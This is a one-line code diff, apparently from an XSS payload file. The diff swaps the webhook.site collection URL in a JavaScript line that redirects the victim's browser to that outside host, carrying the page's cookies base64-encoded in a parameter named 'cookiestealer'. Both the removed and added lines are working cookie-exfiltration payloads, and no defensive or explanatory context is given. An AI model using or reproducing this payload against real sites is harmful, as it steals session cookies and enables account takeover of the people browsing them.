@@ -1,1 +1,1 @@
-document.location='https://webhook.site/9381818e-cd98-4636-a7d4-a8f79c839b55/?cookiestealer='+encodeURIComponent(btoa(document.cookie));
+document.location='https://webhook.site/6eff0331-6c1d-4bb5-9521-8335ced7a82f/?cookiestealer='+encodeURIComponent(btoa(document.cookie));
